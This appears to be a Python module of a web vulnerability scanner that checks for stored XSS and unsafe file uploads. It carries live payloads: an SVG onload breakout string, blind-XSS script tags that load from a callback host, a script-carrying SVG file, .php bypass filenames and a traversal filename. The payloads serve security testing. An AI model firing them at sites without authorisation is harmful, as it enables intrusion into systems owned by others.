"""Deep stored family: stored XSS + upload RCE."""
from __future__ import annotations

import re
import time

from core.colors import info, warn, DIM, RESET
from core.net import ScanBudgetExceeded
from core.registry import check as register_check
from core.scan._shared import Finding, FORM_RE, ACTION_RE, FILE_INPUT_HINT
from core.scan.discovery import _forms, UNFUZZABLE_TYPES
from core.scan.http import _get, _post
from core.wordlists import UPLOAD_PATHS
from core.xss_context import classify_reflection
from core.deep._shared import (
    UPLOAD_BYPASS_NAMES, UPLOAD_OK_HINT, UPLOAD_BLOCK_HINT,
    UPLOAD_JSON_FIELDS, _UPLOAD_URL_HINT,
)


@register_check("stored-xss", "Stored XSS canary + second-order render check", order=10)
def test_stored_xss(session, pages: dict, base: str, timeout: int,
                    verbose: bool = False, deep: bool = True,
                    blind_callback: str | None = None,
                    oob=None) -> list[Finding]:
    """GET formlari her zaman; POST formlar deep modda. Benign canary.

    P1: persistence != XSS. Field-unique canary placed, render locations
    scanned (action + crawled pages = second-order), then a breaker probe
    decides: persistence-only -> LOW unconfirmed; breaker raw in render
    context -> Possible Stored XSS (browser proof arrives in P2).
    """
    forms = []
    for purl, html in (pages or {}).items():
        for f in _forms(html, purl.rsplit("/", 1)[0] if "/" in purl else base):
            f["_page"] = purl
            forms.append(f)
    forms = forms[:8]
    if not forms:
        return []
    canary_base = f"gashstored{int(time.time()) % 100000}"
    out: list[Finding] = []
    for f in forms:
        fields = f.get("fields", {})
        # Never write canaries into password forms: password-change risk plus
        # useless measurement (login/register forms get sqli-login instead).
        if (any(t == "password" for t in fields.values())
                or any("pass" in (n or "").lower() for n in f["inputs"])):
            if verbose:
                print(warn(f"    [-] Stored skipped (password form): {f['action']}"))
            continue
        fuzzable = [n for n in f["inputs"][:4]
                    if fields.get(n, "text") not in UNFUZZABLE_TYPES]
        if not fuzzable:
            continue
        # field-unique canaries: persistence tells us WHICH input renders WHERE
        canaries = {n: f"{canary_base}_{re.sub(r'[^a-z0-9]', '', (n or '').lower())[:12] or 'f'}"
                    for n in fuzzable}
        data = dict(canaries)
        try:
            if f["method"] == "POST":
                if not deep:
                    continue
                _post(session, f["action"], timeout, data=data)
            else:
                from urllib.parse import urlencode
                sep = "&" if "?" in f["action"] else "?"
                _get(session, f["action"] + sep + urlencode(data), timeout)
        except ScanBudgetExceeded:
            raise
        except Exception:
            continue
        # persistence: re-fetch the action page + crawled pages
        # (cache-buster, so proxies/caches can't serve a stale copy).
        # Other render URLs = second-order: input at A, output at B.
        import random
        cb = f"gashcb={random.randint(10000, 99999)}"
        checks = list(dict.fromkeys([f["action"]] + list((pages or {}).keys())[:8]))
        checks = [c + ("&" if "?" in c else "?") + cb for c in checks]
        hits: list[tuple[str, str, str]] = []  # (render_url, field, body)
        for check in checks:
            got = _get(session, check, timeout)
            if not got:
                continue
            body = got[1] or ""
            for field, canary in canaries.items():
                if canary in body:
                    hits.append((check, field, body))
                    break
        if hits:
            render_url, hit_field, _ = hits[0]
            probe_canary = canaries[hit_field]
            probe_payload = f'{probe_canary}"><svg onload=alert(1)>'
            probe_data = dict(canaries)
            probe_data[hit_field] = probe_payload
            try:
                if f["method"] == "POST":
                    _post(session, f["action"], timeout, data=probe_data)
                else:
                    from urllib.parse import urlencode
                    sep = "&" if "?" in f["action"] else "?"
                    _get(session, f["action"] + sep + urlencode(probe_data),
                         timeout)
            except ScanBudgetExceeded:
                raise
            except Exception:
                pass
            confirmed: dict | None = None
            confirmed_at = ""
            loc = "body" if f["method"] == "POST" else "query"
            for recheck in [render_url] + [c for c, _, _ in hits[1:3]]:
                got2 = _get(session, recheck, timeout)
                if not got2:
                    continue
                v = classify_reflection(got2[1], probe_canary, probe_payload)
                if v["status"] == "breakout":
                    confirmed, confirmed_at = v, recheck
                    break
            if confirmed is not None:
                out.append(Finding(
                    title="Possible Stored XSS", severity="MEDIUM",
                    url=f["action"],
                    detail=f"Canary for field '{hit_field}' persists and "
                           f"breaker survives raw in '{confirmed['context']}' "
                           f"context at {confirmed_at} "
                           f"({confirmed['evidence']})",
                    evidence=probe_canary,
                    confidence="Medium",
                    method=f["method"], param=hit_field, location=loc,
                    confirm="breakout",))
                if verbose:
                    print(warn(f"    [!] Stored XSS (breakout): {f['action']}"))
            else:
                out.append(Finding(
                    title="Stored reflection (unconfirmed)", severity="LOW",
                    url=f["action"],
                    detail=f"Canary for field '{hit_field}' persists at "
                           f"{render_url} but breaker chars were not "
                           "observed; not proven executable",
                    evidence=probe_canary,
                    confidence="Low",
                    method=f["method"], param=hit_field, location=loc,))
                if verbose:
                    print(warn(f"    [-] Stored reflection: {f['action']}"))
        if (blind_callback or oob is not None) and sum(
                1 for x in out if x.title.startswith("Blind XSS canary")) < 2:
            # Blind XSS: only place a real canary when someone listens.
            # OOB auto-verifies via drain (no note here); a manual listener
            # gets one LOW note pointing at it. No listener, no noise.
            if oob is not None:
                from core.oob import new_token
                token = new_token()
                blind = f"\"><script src={oob.url_for(token)}>"
            else:
                host = blind_callback.strip().rstrip("/").split("/")[-1]
                token = f"gashblind{int(time.time()) % 100000}"
                blind = f"\"><script src=https://{host}/{token}.js>"
            blind_data = {i: blind for i in fuzzable}
            placed = False
            try:
                if f["method"] == "POST":
                    if deep:
                        placed = _post(session, f["action"], timeout,
                                       data=blind_data) is not None
                    else:
                        continue
                else:
                    from urllib.parse import urlencode
                    sep = "&" if "?" in f["action"] else "?"
                    placed = _get(session, f["action"] + sep + urlencode(blind_data),
                                  timeout) is not None
            except ScanBudgetExceeded:
                raise
            except Exception:
                pass
            if oob is not None:
                if placed:
                    oob.pending.append({"kind": "xss", "target": f["action"],
                                        "token": token})
                continue
            if not placed:
                continue  # degraded request: don't claim a placement
            out.append(Finding(
                title="Blind XSS canary placed (unverified)",
                severity="LOW",
                url=f["action"],
                detail=f"Canary '{token}' placed; watch the '{host}' listener "
                       "for a trigger (unverified)",
                evidence=token,
                confidence="Low",))
    # dedupe repeat hits on the same action
    seen, uniq = set(), []
    for x in out:
        if (x.title, x.url) not in seen:
            seen.add((x.title, x.url))
            uniq.append(x)
    return uniq[:4]


def discover_json_uploads(html: str, base: str) -> list[tuple[str, str]]:
    """API-style upload sinks: fetch/axios POSTs to upload-ish URLs.

    Returns [(url, field)] with a file-ish field name when one is nearby,
    else ("file",). Same-host only, capped at 4. Pure (no requests).
    """
    from urllib.parse import urljoin
    from urllib.parse import urlparse as _up
    out: list[tuple[str, str]] = []
    body = html or ""
    for m in re.finditer(
            r'''(?:fetch|axios\.(?:post|put)|\\$\.(?:post|ajax))\s*\(\s*["']([^"']+)["']''',
            body, re.I):
        raw = m.group(1)
        if not _UPLOAD_URL_HINT.search(raw):
            continue
        full = urljoin(base + "/", raw).split("#")[0]
        try:
            if _up(full).hostname != _up(base).hostname:
                continue
        except Exception:
            continue
        window = body[max(0, m.start() - 200):m.end() + 400]
        field = "file"
        for fm in re.finditer(r'''["']([a-zA-Z_]\w{1,24})["']\s*:''', window):
            if fm.group(1).lower() in UPLOAD_JSON_FIELDS:
                field = fm.group(1)
                break
        if (full, field) not in out:
            out.append((full, field))
        if len(out) >= 4:
            break
    return out


def _upload_ok(resp) -> bool:
    """Accepted-signal shared by upload probes (2xx + ok-hint, no block)."""
    try:
        body = (resp.text or "")[:2000]
        return resp.status_code in (200, 201) \
            and bool(UPLOAD_OK_HINT.search(body)) \
            and not UPLOAD_BLOCK_HINT.search(body)
    except Exception:
        return False


def _json_upload_probes(session, html: str, base: str, timeout: int,
                        verbose: bool = False) -> list[Finding]:
    """JSON/base64 upload: benign text in, served file out (deep only)."""
    import base64
    out: list[Finding] = []
    marker = f"gashjson{int(time.time()) % 100000}"
    raw = f"GASH benign probe - not executable - {marker} - text only".encode()
    blob = base64.b64encode(raw).decode()
    for url, field in discover_json_uploads(html, base)[:2]:
        try:
            r = _post(session, url, timeout,
                      json={field: blob, "filename": "gash_probe.txt"})
        except ScanBudgetExceeded:
            raise
        except Exception:
            continue
        if not r or not _upload_ok(r):
            continue
        m = re.search(r'["\']([^"\']*(?:uploads?|files?|media|static)[^"\']*)["\']',
                      r.text or "", re.I)
        if not m:
            continue  # accepted, but no servable file disclosed: quiet
        from urllib.parse import urljoin as _uj
        try:
            g = _get(session, _uj(url + "/", m.group(1)), timeout)
        except ScanBudgetExceeded:
            raise
        except Exception:
            continue
        if g and marker in (g[1] or ""):
            if verbose:
                print(warn(f"    [!] Stored file via JSON upload: {url}"))
            out.append(Finding(
                title="Stored file via JSON upload", severity="CRITICAL",
                url=url,
                detail=f"Base64 field '{field}' is decoded and served back "
                       f"with our marker at {m.group(1)[:80]}",
                evidence=marker,
                confidence="Medium",))
            break
    return out


def _upload_mismatch_probe(session, endpoint: str, timeout: int,
                           content: bytes,
                           verbose: bool = False) -> list[Finding]:
    """.txt bytes as .png (and vice versa): is anything validated?"""
    try:
        r1 = _post(session, endpoint, timeout,
                   files={"file": ("gash_probe.png", content, "text/plain")},
                   data={"submit": "Upload"})
        r2 = _post(session, endpoint, timeout,
                   files={"file": ("gash_probe.txt", content, "image/png")},
                   data={"submit": "Upload"})
    except ScanBudgetExceeded:
        raise
    except Exception:
        return []
    if r1 and r2 and _upload_ok(r1) and _upload_ok(r2):
        if verbose:
            print(warn(f"    [!] Upload content-type not validated: {endpoint}"))
        return [Finding(
            title="Upload content-type not validated", severity="LOW",
            url=endpoint,
            detail="Same bytes accepted as .png/text-plain and as "
                   ".txt/image-png: neither extension nor content-type "
                   "is meaningfully validated",
            evidence="ext/ct-mismatch",
            confidence="Medium",)]
    return []


def _upload_filename_probe(session, endpoint: str, timeout: int,
                           content: bytes,
                           verbose: bool = False) -> list[Finding]:
    """Traversal-ish filename: does an escaped path come back?

    Benign text only; the claim is reflection of an escaped path, never
    filesystem access.
    """
    try:
        r = _post(session, endpoint, timeout,
                  files={"file": ("..%2F..%2Fgash_probe.txt", content,
                                  "text/plain")},
                  data={"submit": "Upload"})
    except ScanBudgetExceeded:
        raise
    except Exception:
        return []
    if not r or not _upload_ok(r):
        return []
    body = r.text or ""
    m = re.search(r'["\']([^"\']*\.\.[^"\']*)["\']', body)
    if m:
        if verbose:
            print(warn(f"    [!] Upload filename path reflection: {endpoint}"))
        return [Finding(
            title="Upload filename handling (path reflection)",
            severity="LOW",
            url=endpoint,
            detail=f"Traversal-style filename echoes back as a path "
                   f"({m.group(1)[:80]}); verify where it lands server-side",
            evidence="dotdot-path",
            confidence="Low",)]
    return []


@register_check("upload-rce", "Upload filter bypass (benign content, active POST)", order=15, deep_only=True)
def test_upload_rce(session, base: str, html: str, timeout: int,
                    verbose: bool = False, deep: bool = True) -> list[Finding]:
    """Active POST only in deep mode; content always harmless text."""
    if not deep:
        return []
    # find endpoints first: file inputs in forms, or known paths
    endpoints = []
    for m in FORM_RE.finditer(html or ""):
        if FILE_INPUT_HINT.search(m.group(0) or ""):
            am = ACTION_RE.search(m.group(0))
            from urllib.parse import urljoin
            endpoints.append(urljoin(base + "/", (am.group(1) if am else "") or "/"))
    for path in UPLOAD_PATHS:
        url = base + path
        got = _get(session, url, timeout)
        if got and got[0] == 200 and FILE_INPUT_HINT.search(got[1] or ""):
            endpoints.append(url)
    endpoints = list(dict.fromkeys(endpoints))[:3]
    if not endpoints:
        return []

    print(info(f"  [*] Trying upload filter bypass ({len(endpoints)} endpoints)..."))
    out: list[Finding] = []
    content = b"GASH benign probe - not executable - text only"
    svg_content = (b'<svg xmlns="http://www.w3.org/2000/svg">'
                   b'<script>/*gashsvgmarker*/</script></svg>')
    for ep in endpoints:
        results: dict[str, bool] = {}
        disclosed = ""
        for fname in UPLOAD_BYPASS_NAMES:
            body_bytes = svg_content if fname.endswith(".svg") else content
            r = _post(session, ep, timeout,
                      files={"file": (fname, body_bytes, "text/plain")},
                      data={"submit": "Upload"})
            if not r:
                results[fname] = False
                continue
            body = r.text or ""
            window = body[:2000]
            ok = r.status_code in (200, 201) and UPLOAD_OK_HINT.search(window) \
                and not UPLOAD_BLOCK_HINT.search(window)
            # did it leak an open file URL?
            m = re.search(r'["\']([^"\']*uploads?[^"\']*)["\']', body, re.I)
            if m:
                disclosed = m.group(1)
            results[fname] = bool(ok)
        ctrl = results.get("gash_probe.txt", False)
        php_direct = results.get("gash_probe.php", False)
        bypass_hit = [n for n in UPLOAD_BYPASS_NAMES[2:] if results.get(n)]
        if verbose:
            print(f"    {DIM}{ep} -> {results}{RESET}")
        if php_direct:
            out.append(Finding(
                title="Possible Unrestricted File Upload (confirmed)",
                severity="CRITICAL",
                url=ep,
                detail="Harmless text accepted as .php; code execution may be "
                       "possible (verify RCE manually)"
                       + (f" File URL: {disclosed}." if disclosed else ""),
                evidence="gash_probe.php",
                confidence="Medium",))
        elif bypass_hit:
            blocked_php = (" (plain .php is blocked)" if not php_direct else "")
            out.append(Finding(
                title="Upload Filter Bypass (RCE vector)", severity="CRITICAL",
                url=ep,
                detail="Harmless text accepted under these names: "
                       f"{', '.join(bypass_hit)}{blocked_php}."
                       + (f" File URL: {disclosed}." if disclosed else "") +
                       " Verify RCE manually",
                evidence=",".join(bypass_hit),
                confidence="Medium",))
        elif ctrl:
            out.append(Finding(
                title="Possible Unrestricted File Upload (confirmed)",
                severity="CRITICAL",
                url=ep,
                detail="Harmless .txt file accepted; extension filter missing/weak",
                evidence="gash_probe.txt",
                confidence="Medium",))
        # SVG proof: if the script-carrying file is served back unmodified,
        # the upload is not just accepted — it executes.
        if results.get("gash_probe.svg") and disclosed:
            from urllib.parse import urljoin as _uj
            try:
                g = _get(session, _uj(ep + "/", disclosed), timeout)
            except ScanBudgetExceeded:
                raise
            except Exception:
                g = None
            if g and "gashsvgmarker" in (g[1] or ""):
                if verbose:
                    print(warn(f"    [!] Stored XSS via SVG: {disclosed}"))
                out.append(Finding(
                    title="Possible Stored XSS (SVG upload)", severity="CRITICAL",
                    url=_uj(ep + "/", disclosed),
                    detail="Uploaded SVG with script content is served back "
                           "unmodified (marker reflected)",
                    evidence="gashsvgmarker",
                    confidence="High",))
    if endpoints:
        first = endpoints[0]
        out += _json_upload_probes(session, html, base, timeout, verbose)
        out += _upload_mismatch_probe(session, first, timeout, content,
                                      verbose)
        out += _upload_filename_probe(session, first, timeout, content,
                                      verbose)
    return out


__all__ = [
    "test_stored_xss",
    "discover_json_uploads", "_upload_ok",
    "_json_upload_probes", "_upload_mismatch_probe", "_upload_filename_probe",
    "test_upload_rce",
]
